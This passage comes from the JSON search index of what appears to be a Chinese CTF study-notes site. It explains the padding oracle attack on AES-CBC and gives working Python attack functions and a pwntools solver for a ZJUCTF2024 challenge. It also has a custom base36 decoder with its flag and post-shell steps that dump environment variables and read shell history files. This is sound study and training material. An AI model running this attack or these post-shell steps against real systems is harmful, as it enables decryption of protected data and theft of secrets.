Attack\uff09","text":"<p>\u586b\u5145\u9884\u8a00\u673a\u653b\u51fb\u662f\u4e00\u79cd\u5bc6\u7801\u5b66\u653b\u51fb\uff0c\u5b83\u5229\u7528\u4e86\u5bc6\u7801\u7cfb\u7edf\u5728\u5904\u7406\u586b\u5145\u9519\u8bef\u65f6\u7684\u884c\u4e3a\u3002\u8fd9\u79cd\u653b\u51fb\u5141\u8bb8\u653b\u51fb\u8005\u5728\u4e0d\u77e5\u9053\u52a0\u5bc6\u5bc6\u94a5\u7684\u60c5\u51b5\u4e0b\u89e3\u5bc6\u6570\u636e\uff0c\u6216\u8005\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u751a\u81f3\u53ef\u4ee5\u52a0\u5bc6\u6570\u636e\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/padding_oracle_attack/#_1","title":"\u653b\u51fb\u539f\u7406","text":"<p>\u586b\u5145\u9884\u8a00\u673a\u653b\u51fb\u7684\u6838\u5fc3\u5728\u4e8e\u5206\u7ec4\u5bc6\u7801\u7684\u586b\u5145\u673a\u5236\u3002\u5728\u5206\u7ec4\u5bc6\u7801\u4e2d\uff0c\u6570\u636e\u88ab\u5206\u6210\u56fa\u5b9a\u5927\u5c0f\u7684\u5757\u8fdb\u884c\u52a0\u5bc6\u3002\u5982\u679c\u6570\u636e\u4e0d\u8db3\u4ee5\u586b\u6ee1\u6700\u540e\u4e00\u4e2a\u5757\uff0c\u5c31\u9700\u8981\u6dfb\u52a0\u586b\u5145\u3002\u5e38\u89c1\u7684\u586b\u5145\u6807\u51c6\u5982 <code>PKCS #5</code> \u548c <code>PKCS #7</code> \uff0c\u4f1a\u5728\u6570\u636e\u672b\u5c3e\u6dfb\u52a0\u4e00\u7cfb\u5217\u7684\u5b57\u8282\uff0c\u4f7f\u5f97\u6700\u540e\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u6ee1\u8db3\u52a0\u5bc6\u7b97\u6cd5\u7684\u8981\u6c42\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf\u7cfb\u7edf\u5904\u7406\u586b\u5145\u9519\u8bef\u7684\u65b9\u5f0f\u6765\u63a8\u65ad\u51fa\u5173\u4e8e\u52a0\u5bc6\u6570\u636e\u7684\u4fe1\u606f\u3002\u4f8b\u5982\uff0c\u5982\u679c\u7cfb\u7edf\u5728\u586b\u5145\u9519\u8bef\u65f6\u8fd4\u56de\u4e0d\u540c\u7684\u9519\u8bef\u6d88\u606f<sup>1</sup>\uff0c\u6216\u8005\u5904\u7406\u65f6\u95f4\u6709\u663e\u8457\u5dee\u5f02\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u4fe1\u606f\u6765\u9010\u6b65\u63a8\u65ad\u51fa\u539f\u59cb\u6570\u636e\u6216\u52a0\u5bc6\u5bc6\u94a5\u3002</p> <p></p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/padding_oracle_attack/#_2","title":"\u653b\u51fb\u6b65\u9aa4","text":"<p>\u83b7\u53d6\u5bc6\u6587\u548c\u521d\u59cb\u5316\u5411\u91cf\uff08IV\uff09\uff1a\u653b\u51fb\u8005\u9996\u5148\u9700\u8981\u83b7\u53d6\u5230\u5bc6\u6587\u548c\u7528\u4e8e CBC \u6a21\u5f0f\u52a0\u5bc6\u7684\u521d\u59cb\u5316\u5411\u91cf\u3002</p> <p>\u4fee\u6539\u5bc6\u6587\uff1a\u653b\u51fb\u8005\u5bf9\u5bc6\u6587\u8fdb\u884c\u4fee\u6539\uff0c\u7136\u540e\u53d1\u9001\u7ed9\u7cfb\u7edf\u8fdb\u884c\u89e3\u5bc6\u5c1d\u8bd5\u3002</p> <p>\u5206\u6790\u54cd\u5e94\uff1a\u6839\u636e\u7cfb\u7edf\u7684\u54cd\u5e94\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5224\u65ad\u51fa\u4fee\u6539\u540e\u7684\u5bc6\u6587\u662f\u5426\u5bfc\u81f4\u4e86\u6709\u6548\u7684\u586b\u5145\u3002</p> <p>\u63a8\u65ad\u5bc6\u6587\u5757\uff1a\u901a\u8fc7\u9010\u4e2a\u5b57\u8282\u4fee\u6539\u5bc6\u6587\u5757\u5e76\u89c2\u5bdf\u7cfb\u7edf\u54cd\u5e94\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u63a8\u65ad\u51fa\u5bc6\u6587\u5757\u7684\u5185\u5bb9\u3002</p> <p>\u91cd\u590d\u4ee5\u4e0a\u6b65\u9aa4\uff1a\u5bf9\u4e8e\u591a\u4e2a\u5bc6\u6587\u5757\uff0c\u653b\u51fb\u8005\u91cd\u590d\u4ee5\u4e0a\u6b65\u9aa4\uff0c\u76f4\u5230\u6574\u4e2a\u5bc6\u6587\u88ab\u89e3\u5bc6\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/padding_oracle_attack/#_3","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u8981\u6210\u529f\u8fdb\u884c\u586b\u5145\u9884\u8a00\u673a\u653b\u51fb\uff0c\u5fc5\u987b\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff1a - \u653b\u51fb\u8005\u80fd\u591f\u83b7\u53d6\u5230\u5bc6\u6587\u548c\u521d\u59cb\u5316\u5411\u91cf\u3002 - \u7cfb\u7edf\u5728\u5904\u7406\u586b\u5145\u9519\u8bef\u65f6\u5fc5\u987b\u6709\u53ef\u89c2\u5bdf\u7684\u884c\u4e3a\u5dee\u5f02\uff0c\u4f8b\u5982\u4e0d\u540c\u7684\u9519\u8bef\u6d88\u606f\u6216\u5904\u7406\u65f6\u95f4\u5dee\u5f02\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/padding_oracle_attack/#ctf","title":"CTF \u5b9e\u4f8b","text":"<p>\u6765\u81ea ZJUCTF2024 crypto eazy_pad \u3002</p> <p>\u8bb0\uff1a\u4ece\u9898\u76ee\u4e2d\u83b7\u53d6\u7684 IV \u4e3a IV\uff0c\u800c\u4e4b\u540e\u4ea4\u4ed8\u7ed9\u89e3\u5bc6\u51fd\u6570/\u670d\u52a1\u5668\u7684\u3001\u9644\u5728 ciphertext \u4e4b\u524d\u7684\u4e3a attack_IV\uff1b\u771f\u6b63\u7684\u660e\u6587\u4e3a P\uff0c\u800c\u89e3\u5bc6\u51fd\u6570/\u670d\u52a1\u5668\u89e3\u5bc6 attack_IV+ciphertext \u540e\u7684\u660e\u6587\u8bb0\u4f5c P_ \u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/padding_oracle_attack/#_4","title":"\u8001\u601d\u8def","text":"<p>\u5728 ctf 101 \u77ed\u5b66\u671f\u8bfe\u7a0b\u4e2d\uff0c\u5176\u5b9e\u5df2\u7ecf\u5b66\u4e60\u8fc7 padding oracle attack\uff0c\u4f46\u662f\u6211\u5f53\u65f6\u7684\u7406\u89e3\u6709\u7f3a\u9677\uff0c\u601d\u8def\u5982\u4e0b</p> <p></p> <p>\u5373\u6211\u8ba4\u4e3a\uff1a</p> <pre><code>D[-1] = attack_IV[-1] ^ P_[-1] # P_[-1] \u5373 b'\\x01'\nP[-1] = D[-1] ^ IV[-1]\n</code></pre> <p>\u7531\u6b64\u89e3\u51fa P\uff0c\u4f9d\u6b21\u7c7b\u63a8\uff0c\u5f97\u5230\u4e0b\u9762\u7684\u653b\u51fb\u51fd\u6570\uff1a</p> old_padding<pre><code>def padding_oracle_attack(encrypt_msg):\n    gus = set()\n    IV = encrypt_msg[:16]\n    print(\"IV: \", IV)\n    ciphertext = encrypt_msg[16:]\n    block_size = 16\n    # 16 \u5b57\u8282\u4e00\u7ec4\n    blocks = [\n        ciphertext[i : i + block_size] for i in range(0, len(ciphertext), block_size)\n    ]\n    # print(blocks)\n    plaintext = b\"\"\n\n    for block_index in range(len(blocks)):\n        # \u51b3\u5b9a \"IV\"\n        if block_index == 0:\n            previous_block = IV\n        else:\n            previous_block = blocks[block_index - 1]\n\n        current_block = blocks[block_index]\n        # print(\"current_block: \", current_block)\n        decrypted_block = bytearray(16)\n\n        for byte_index in range(block_size - 1, -1, -1):\n            attack_IV = bytearray(16)\n\n            padding_value = block_size - byte_index\n            # print(padding_value)\n            for i in range(block_size - 1, byte_index, -1):\n                attack_IV[i] = decrypted_block[i] ^ padding_value\n            # print(attack_IV)\n            for guess in range(256):\n                attack_IV[byte_index] = guess\n                attack_ciphertext = attack_IV + current_block\n\n                if decrypt(attack_ciphertext):\n                    gus.add(guess)\n                    decrypted_byte = guess ^ padding_value\n                    decrypted_block[byte_index] = decrypted_byte\n                    break\n        # previous_block \u53d1\u6325\u7684\u662f IV \u7684\u529f\u80fd\n        plaintext_block = xor_bytes(decrypted_block, previous_block)\n        plaintext += plaintext_block\n    # \u5c06gus \u53d8\u4e3a\u5217\u8868\u5e76\u6392\u5e8f\n    print(sorted(list(gus)))\n    return plaintext\n</code></pre> <p>\u4f46\u662f\uff0c\u8fd9\u9053\u9898\u8981\u6c42\u8bbf\u95ee\u6b21\u6570\u4e3a 0x2024\uff0c\u7ea6 8000 \u6b21\uff1b\u800c\u6211\u4eec\u8fd9\u6837\u9700\u8981 \\(256*32 =8192\\) \u6b21\uff1b\u5373\u4fbf\u4e0d\u662f\u6bcf\u6b21\u90fd\u8981\u5230 256 \u624d\u7ed3\u675f\uff0c\u6211\u4eec\u5047\u5b9a\u662f 128 \u6b21\uff1b\u53c8\u56e0\u4e3a\u9898\u4e2d</p> <pre><code>def decrypt(msg: bytes):\n    global cout\n    cout += 1\n    IV = msg[:16]\n    cipher = AES.new(KEY, AES.MODE_CBC, IV)\n    decrypted = cipher.decrypt(msg[16:])\n    return unpad(decrypted) ^ (random.random() &gt; 0.1)\n</code></pre> <p>\u8fd4\u56de\u7ed3\u679c\u5bf9 padding valid \u7684\u5224\u65ad\u8fdb\u884c\u4e86 0.9 \u6982\u7387\u7684\u7ffb\u8f6c\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u591a\u8bd5\u51e0\u6b21\u624d\u80fd\u591f\u4fdd\u8bc1\u67d0\u4e00\u6b21\u7684 padding valid \u662f\u5426\u6b63\u786e\u3002\u8fd9\u5bfc\u81f4\u6b21\u6570\u8981\u4e3a\u539f\u6765\u7684 10 \u500d\uff0c\u90a3\u4e48\u6211\u4eec\u7684\u6b21\u6570\u8fdc\u8fdc\u4e0d\u591f\u4e86\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/padding_oracle_attack/#_5","title":"\u65b0\u601d\u8def","text":"<p>\u6211\u4eec\u4e3a\u4ec0\u4e48\u8981\u6267\u7740\u4e8e\u89e3\u51fa D ? ciphertext-&gt;decryptedtext \u8fd9\u4e00\u8fc7\u7a0b\u603b\u662f\u4e0d\u53d8\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4 D \u662f\u4e0d\u53d8\u7684\u3002\u6211\u4eec\u60f3\u8ba9 P[-1]=b\"\\x01\" \uff0c\u53ef\u4ee5\u63a8\u5bfc\uff1a</p> <pre><code>IV[-1]^D[-1]=P[-1] # =&gt;\nIV[-1]^P[-1]^P_[-1]^D[-1]=P[-1]^P[-1]^P_[-1] = P_[-1] # \u5373 b'\\x01'\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u904d\u5386 P[-1] \uff0c\u6784\u9020 attack_IV \u5373\u53ef\nattack_IV[-1]=IV[-1]^P[-1]^P_[-1]\n</code></pre> <p>\u8fd9\u4e2a\u601d\u8def\u80fd\u591f\u5c06\u6211\u4eec\u904d\u5386\u7684\u76ee\u6807\u7531 attack_IV \u53d8\u4e3a P\uff0c\u5373 256-&gt;|M| \uff0c\u5176\u4e2d M \u4ee3\u8868\u660e\u6587\u7a7a\u95f4\uff1b\u53c8\u7531\u9898\u610f\u53ef\u77e5\uff0c\u6211\u4eec\u7684\u660e\u6587\u7a7a\u95f4 M={0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f} \uff0c\u90a3\u4e48\u6b21\u6570\u5c31\u591f\u4e86\uff1a</p> padding_oracle<pre><code>def padding_oracle_attack(encrypt_msg):\n    IV = encrypt_msg[:16]\n    ciphertext = encrypt_msg[16:]\n    block_size = 16\n    blocks = [\n        ciphertext[i : i + block_size] for i in range(0, len(ciphertext), block_size)\n    ]\n    # print(\"blocks: \", blocks, len(blocks))\n    full_plaintext = b\"\"\n\n    for block_index in range(len(blocks)):\n        if block_index == 0:\n            attack_IV = bytearray(IV)\n        else:\n            attack_IV = bytearray(blocks[block_index - 1])\n\n        current_block = blocks[block_index]\n        plaintext = bytearray(16)\n        for byte_index in range(block_size - 1, -1, -1):\n            padding_value = block_size - byte_index\n            # print(\"padding_value: \", padding_value)\n\n            for i in range(block_size - 1, byte_index, -1):\n                attack_IV[i] = IV[i] ^ plaintext[i] ^ padding_value\n            # print(\"attack_IV: \", attack_IV)\n            for pf in b\"0123456789abcdef\":\n                attack_IV[byte_index] = IV[byte_index] ^ pf ^ padding_value\n                attack_cipher = attack_IV + current_block\n                # print(\"attack_cipher: \", attack_cipher)\n\n                if padding_decide(attack_cipher):\n                    plaintext[byte_index] = pf\n                    # print(\"plaintext: \", plaintext)\n                    break\n        IV = current_block\n        full_plaintext += plaintext\n    return full_plaintext\n</code></pre> <p>\u81f3\u6b64\u672c\u9898\u544a\u7834\uff0c\u7ed3\u5408\u9898\u76ee\u7684\u4ea4\u4e92\u811a\u672c\u5982\u4e0b\uff1a</p> easy_pad_solver.py<pre><code>from pwn import *\nfrom Crypto.Util.Padding import pad, unpad\nfrom padding_oracle import padding_oracle_attack\n\n\npad_length = 16\npad = lambda msg: msg + (chr(pad_length) * (16 - len(msg) % 16)).encode()\nunpad = lambda msg: bytes([msg[-1]]) * msg[-1] == msg[-msg[-1] :]\n\n\ndef handOutMsg(message):\n    print(\"hand out ing .............\")\n    con.sendafter(b\"Quit\", b\"2\\n\")\n    con.sendafter(b\"Give me message\", message.encode() + b\"\\n\")\n\n\ndef sendAttackCiphertext(attack_ciphertext):\n    # \u5c06attack_ciphertext \u7531 bytearray \u8f6c\u4e3a\u53ef\u53d1\u9001\u7684\u6570\u636e\u7c7b\u578b\n    attack_ciphertext = attack_ciphertext.hex().encode()\n    try:\n        con.sendafter(b\"2. Quit\", b\"1\\n\")\n        con.sendafter(b\"Give me ciphertext\", attack_ciphertext + b\"\\n\")\n        respon = con.recvuntil(b\"1. Decrypt\").decode()\n        return respon\n    except EOFError:\n        print(\"Connection closed unexpectedly\")\n        return None\n\n\ndef padding_decide(attack_ciphertext):\n    times = 16\n    responses = [sendAttackCiphertext(attack_ciphertext) for _ in range(times)]\n    # \u8d85\u8fc7\u4e00\u534a\u7684\u8fd4\u56de\u503c\u4e3aFalse\uff0c\u5219\u8fd4\u56deTrue\n    if sum(1 for resp in responses if \"False\" in resp) &gt; times / 2:\n        return True\n    elif sum(1 for resp in responses if \"True\" in resp) &gt; times / 2:\n        return False\n    else:\n        raise ValueError(\"padding_decide error\")\n\n\ncontext.log_level = \"debug\"\ncon = connect(\"127.0.0.1\", 61600)\n\nencrypt_msg = con.recvuntil(b\"\\n\")[:-1]  # remove the last '\\n'\nencrypt_msg = bytes.fromhex(encrypt_msg.decode())\nprint(encrypt_msg)\n# exit()\n\nrecovered_bytes = padding_oracle_attack(encrypt_msg)\nprint(\"recovered_bytes\", recovered_bytes)\nrecovered_message = recovered_bytes.decode(\"ascii\")\nprint(\"recovered_message: \", recovered_message)\nhandOutMsg(recovered_message)\n\ncon.recvall(timeout=10)\ncon.close()\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/padding_oracle_attack/#_6","title":"\u66f4\u52a0\u901a\u7528\u7684\u811a\u672c","text":"padding_oracle.py<pre><code>from string import printable\n\n\ndef padding_oracle_attack(\n    encrypt_msg: bytes, padding_decide, plaintext_set=printable\n) -&gt; bytes:\n    IV = encrypt_msg[:16]\n    ciphertext = encrypt_msg[16:]\n    block_size = 16\n    blocks = [\n        ciphertext[i : i + block_size] for i in range(0, len(ciphertext), block_size)\n    ]\n    full_plaintext = b\"\"\n\n    for block_index in range(len(blocks)):\n        if block_index == 0:\n            attack_IV = bytearray(IV)\n        else:\n            attack_IV = bytearray(blocks[block_index - 1])\n\n        current_block = blocks[block_index]\n        plaintext = bytearray(16)\n        for byte_index in range(block_size - 1, -1, -1):\n            padding_value = block_size - byte_index\n\n            for i in range(block_size - 1, byte_index, -1):\n                attack_IV[i] = IV[i] ^ plaintext[i] ^ padding_value\n            # the char set of plaintext\n            plaintext_set = [ord(c) for c in printable]\n            for pf in plaintext_set:\n                attack_IV[byte_index] = IV[byte_index] ^ pf ^ padding_value\n                attack_cipher = attack_IV + current_block\n                if padding_decide(attack_cipher):\n                    plaintext[byte_index] = pf\n                    print(\"plaintext: \", plaintext)\n                    break\n        IV = current_block\n        full_plaintext += plaintext\n    return full_plaintext\n</code></pre> <ol> <li> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u5bc6\u6587\u6ca1\u6709\u88ab\u7be1\u6539\uff0c\u5219\u89e3\u5bc6\u6210\u529f\uff0c\u5e76\u4e14\u4e1a\u52a1\u6821\u9a8c\u6210\u529f\uff0c\u54cd\u5e94200\uff1b\u5982\u679c\u5bc6\u6587\u88ab\u7be1\u6539\uff0c\u670d\u52a1\u7aef\u65e0\u6cd5\u5b8c\u6210\u89e3\u5bc6\uff0c\u89e3\u5bc6\u6821\u9a8c\u5931\u8d25\uff0c\u5219\u54cd\u5e94500\uff1b\u5982\u679c\u5bc6\u6587\u88ab\u7be1\u6539\uff0c\u4f46\u662f\u670d\u52a1\u7aef\u89e3\u5bc6\u6210\u529f\uff0c\u4f46\u4e1a\u52a1\u903b\u8f91\u6821\u9a8c\u5931\u8d25\uff0c\u5219\u53ef\u80fd\u8fd4\u56de200\u6216302\u7b49\u54cd\u5e94\u7801,\u800c\u4e0d\u662f\u54cd\u5e94500\u00a0\u21a9</p> </li> </ol>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/stream_cipher/","title":"Stream cipher","text":"<p>Stream cipher</p> <p>A stream cipher is a symmetric key cipher where plaintext digits are combined with a pseudorandom cipher digit stream (keystream). In a stream cipher, each plaintext digit is encrypted one at a time with the corresponding digit of the keystream, to give a digit of the ciphertext stream. </p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/stream_cipher/#rc4","title":"RC4","text":"<ul> <li>https://ctf-wiki.org/crypto/streamcipher/special/rc4/</li> </ul>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/stream_cipher/#zuc","title":"ZUC","text":"<ul> <li> <p>https://openstd.samr.gov.cn/bzgk/gb/std_list?p.p1=0&amp;p.p90=circulation_date&amp;p.p91=desc&amp;p.p2=%E7%A5%96%E5%86%B2%E4%B9%8B</p> </li> <li> <p>https://www.bilibili.com/video/BV1xG4y1v7pK/?vd_source=0a037c4dd2becee04d2b1ccafdc1862e</p> </li> </ul>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/%E5%9B%BD%E5%AE%B6%E5%95%86%E7%94%A8%E5%AF%86%E7%A0%81/","title":"\u56fd\u5bb6\u5546\u7528\u5bc6\u7801","text":"","tags":["notes","crypto"]},{"location":"CTF/NOTE/crypto/%E5%9B%BD%E5%AE%B6%E5%95%86%E7%94%A8%E5%AF%86%E7%A0%81/#_1","title":"\u4ecb\u7ecd","text":"<p>\u5546\u7528\u5bc6\u7801</p> <p>\u5546\u7528\u5bc6\u7801\u662f\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u653f\u5e9c\u7528\u4e8e\u975e\u56fd\u5bb6\u673a\u5bc6\u4fe1\u606f\u4fdd\u62a4\u6240\u91c7\u7528\u7684\u4e00\u7cfb\u5217\u5bc6\u7801\u6280\u672f\u548c\u5bc6\u7801\u4ea7\u54c1\u7684\u603b\u79f0\uff0c\u5176\u76f8\u5173\u6280\u672f\u90e8\u5206\u4e3a\u56fd\u5bb6\u79d8\u5bc6\u3002\u5546\u7528\u5bc6\u7801\u7684\u7814\u53d1\u53ca\u4f7f\u7528\u7531\u56fd\u5bb6\u5bc6\u7801\u7ba1\u7406\u5c40\u7edf\u4e00\u7ba1\u7406\u3002</p> <p>\u4ec0\u4e48\u662f\u56fd\u5bc6\u7b97\u6cd5\uff1f</p> <p></p> <p>\u90e8\u5206\u5bc6\u7801\u7b97\u6cd5\u7ec6\u8282\u5df2\u516c\u5f00\uff0c\u53ef\u5728 \u56fd\u5bb6\u5bc6\u7801\u7ba1\u7406\u5c40 \u6216 \u56fd\u5bb6\u6807\u51c6\u5168\u6587\u516c\u5f00\u7cfb\u7edf \u67e5\u8be2\u3002</p>","tags":["notes","crypto"]},{"location":"CTF/NOTE/crypto/%E5%9B%BD%E5%AE%B6%E5%95%86%E7%94%A8%E5%AF%86%E7%A0%81/#_2","title":"\u6269\u5c55\u94fe\u63a5","text":"<p>\u5b66\u4e60\u63a8\u8350\uff1aBilibili - \u53ef\u5389\u5bb3\u7684\u571f\u8c46</p> <p>\u4ee3\u7801\u5b9e\u73b0\uff1a GmSSL or GmSSL-Python \uff0c\u4f7f\u7528\u6587\u6863  \u3002</p>","tags":["notes","crypto"]},{"location":"CTF/NOTE/other/base_code/","title":"Base code","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/base_code/#_1","title":"\u5f15\u5165","text":"<p>\u9996\u5148\u5141\u8bb8\u6211\u4f7f\u7528\u660e\u6587\u548c\u5bc6\u6587\u6765\u5bf9\u5e94\u7f16\u7801\u524d\u540e\u7684\u4fe1\u606f\uff1b\u59d1\u4e14\u5c06\u5176\u770b\u4f5c\u5bc6\u94a5\u516c\u5f00\u7684\u5bf9\u79f0\u52a0\u5bc6\u5427\u3002</p> <p>\u4e00\u76f4\u4ee5\u6765\uff0c\u90fd\u628a base \u7f16\u7801/\u89e3\u7801\u5f53\u4f5c\u7406\u6240\u5e94\u5f53\u7684\u4e8b\u60c5\uff1b\u5145\u5176\u91cf\u4e5f\u5c31\u662f\u4e86\u89e3\u5230\uff1a</p> <ul> <li>base \u7f16\u7801\u662f\u5c06\u660e\u6587\u4ee5 ASCII \u7684\u5f62\u5f0f\u8f6c\u53d8\u4e3a\u4e8c\u8fdb\u5236\u6d41\uff1b</li> <li>base 16/32/64 \u7b49\u4ee5 4/5/6 \u4f4d\u4e8c\u8fdb\u5236\u6570\u53bb\u8fdb\u884c\u622a\u65ad\uff0c\u4e4b\u540e\u6620\u5c04\u5230\u5bf9\u5e94\u7684\u5b57\u7b26\u5373\u53ef\u3002</li> </ul> <p>\u4f46\u662f\u95ee\u9898\u6765\u4e86\uff0cbase36/52 \u7b49\u7b49\u5462\uff1f\u5b83\u4eec\u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff1f</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/base_code/#_2","title":"\u5b9e\u6218","text":"<p>\u5f15\u53d1\u8fd9\u4e2a\u601d\u8003\u6765\u81ea\u4e8e zjuctf2024 \u7684 \u201c\u9505\u91cc\u635e\u9762\u201d \u9898\u3002\u8fd9\u9053\u9898\u524d\u9762\u83b7\u53d6\u5bc6\u6587\u548c\u63d0\u793a\u90fd\u8f83\u4e3a\u590d\u6742\uff0c\u5177\u4f53\u89c1 <code>ZJUCTF2024 #MISC</code> \u9898\u89e3\u3002</p> <p>\u6211\u4eec\u5f97\u5230\u4e24\u90e8\u5206\u4fe1\u606f\uff1a</p> <ul> <li><code>AYICIKQXHR320E7CHW4Y84ZGM954UG061H9QV9X2360TJJ37H9ABL42ABJH5BB</code></li> <li><code>BASE36ENCODETABLE:ZJUCTF24ABDEGHIKLMNOPQRSVWXY01356789</code></li> </ul> <p>\u4e5f\u5c31\u8bf4\u6211\u4eec\u8981\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684 base36 \u6765\u89e3\u7801\u4e0a\u9762\u7684\u5185\u5bb9\u3002</p> <p>\u663e\u7136\uff0c\u660e\u6587\u7a7a\u95f4\uff1a<code>ZJUCTF24ABDEGHIKLMNOPQRSVWXY01356789</code> \u3002</p> <p>\u8d77\u521d\uff0c\u6211\u7684\u60f3\u6cd5\u662f\uff1a\\(log_2 36 &lt; 6\\) \u6240\u4ee5\u8f6c 6 \u4f4d\u4e8c\u8fdb\u5236\uff0c\u968f\u540e\u6bcf 8 \u4f4d\u622a\u65ad\uff1b\u4f46\u662f\u81ea\u7136\u662f\u9519\u4e86\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/base_code/#_3","title":"\u5b66\u4e60","text":"<p>base \u662f\u8fdb\u5236\uff0cbase36 \u4ee3\u8868\u7684\u5e94\u8be5\u662f 36 \u8fdb\u5236\uff0c\u53ea\u4e0d\u8fc7\u7528\u5bf9\u5e94\u5b57\u7b26\u6765\u8868\u793a\uff1b\u5c31\u50cf 16 \u8fdb\u5236\u4e00\u6837\uff0c\u5b57\u6bcd\u8868\u793a\u7684\u4e5f\u662f\u6570\u5b57\u3002</p> <p>\u90a3\u4e48\u5c31\u5f88\u7b80\u5355\u4e86\uff0c\u6240\u8c13\u7684 base \u7f16\u7801\u4e0d\u8fc7\u662f\u8fdb\u5236\u8f6c\u6362\uff0c\u6211\u4eec\u505a\u7684\uff0c\u4e0d\u8fc7\u662f 36 \u8fdb\u5236\u8f6c 256 \u8fdb\u5236\uff08ASCII\uff09\uff1b\u53c8 long_to_bytes \u5176\u5b9e\u505a\u7684\u5c31\u662f 10 \u8fdb\u5236\u8f6c 256 \u8fdb\u5236\uff0c\u6240\u4ee5\u6709\uff1a</p> self_base.py<pre><code>base = 36\ncustom_base = \"ZJUCTF24ABDEGHIKLMNOPQRSVWXY01356789\"\n\ncipher_str = \"AYICIKQXHR320E7CHW4Y84ZGM954UG061H9QV9X2360TJJ37H9ABL42ABJH5BB\"\n\nassert len(custom_base) == base\n\n# print(\"len(cipher) =\", len(cipher))\ncipher_int = 0\nfor c in cipher_str:\n    cipher_int = cipher_int * base + custom_base.index(c)\n\nprint(\"cipher_int =\", hex(cipher_int))\n\nfrom Crypto.Util.number import long_to_bytes\n\nprint(long_to_bytes(cipher_int))\n</code></pre> <p>Flag</p> <p>ZJUCTF{A_13G3nd4Ry_4h0uR-T3l36r4Phls7XD}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/what_to_do_after_get_shell/","title":"What to do after get shell","text":"<p>\u62ff\u5230 shell/ \u53ef\u4ee5\u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e86\u90fd\u4e0d\u77e5\u9053\u8be5\u5e72\u4ec0\u4e48\uff1f\u4e0b\u9762\u662f\u53ef\u80fd\u7684\u601d\u8def\u4ee5 moectf2024 moejail_lv1 \u4e3a\u4f8b\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/what_to_do_after_get_shell/#_1","title":"\u66b4\u529b\u641c\u7d22\u6587\u4ef6\u5185\u5bb9","text":"<p>\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>find . -name \"*\" -exec grep -H \"flag{\" {} \\;</code> \u6765\u9012\u5f52\u641c\u7d22\u6587\u4ef6\u4e2d\u5305\u542b <code>flag{</code> \u5b57\u6bb5\u7684\u6587\u4ef6\uff0c\u719f\u6089\u547d\u4ee4\u7684\u8bdd\u53ef\u4ee5\u77e5\u9053\uff0c<code>.</code> \u8868\u793a\u7531\u5f53\u524d\u8def\u5f84\u5f00\u59cb\uff0c<code>*</code> \u6240\u5728\u7684\u5f15\u53f7\u5185\u8868\u793a\u5339\u914d\u7684\u6587\u4ef6\u540d\uff0c<code>*</code> \u8868\u793a\u6211\u4eec\u60f3\u8981\u641c\u7d22\u6240\u6709\u6587\u4ef6\u3002</p> <p>\uff08\u8fd9\u91cc\u4f7f\u7528 /tmp/ \u662f\u56e0\u4e3a\u6211\u5df2\u7ecf\u77e5\u9053\u5b83\u5728\u90a3\u4e86\uff0c\u8282\u7ea6\u65f6\u95f4\uff09</p> <p></p> <p>\u5982\u679c\u53d1\u73b0\u4ec0\u4e48\u90fd\u6ca1\u641c\u5230\uff0c\u53ef\u80fd\u9700\u8981\u6ce8\u610f\u7684\u662fglobbing pathnames\uff1a</p> <p>If a filename starts with a <code>.</code>, this character must be matched explicitly.  (Thus, rm _ will not remove .profile, and _tar c  will not archive all your files; tar c . is better.)</p> <p>\u4f8b\u5982</p> <p></p> <p>\u4f46\u662f</p> <p></p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/what_to_do_after_get_shell/#_2","title":"\u67e5\u770b\u4e00\u4e9b\u5173\u952e\u4fe1\u606f","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/what_to_do_after_get_shell/#_3","title":"\u73af\u5883\u53d8\u91cf","text":"<p>\u6267\u884c <code>env</code> \u6216\u8005 <code>set</code> \u53ef\u4ee5\u67e5\u770b\u73af\u5883\u53d8\u91cf\uff08\u6709\u65f6\u53ef\u80fd\u5c31\u662f <code>echo $FLAG</code> \u5c31\u53ef\u4ee5\u4e86\uff09\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/what_to_do_after_get_shell/#_4","title":"\u547d\u4ee4\u5386\u53f2","text":"<p>\u5728 <code>~/.history</code> <code>~/.bash_history</code> <code>~/.zsh_history</code> 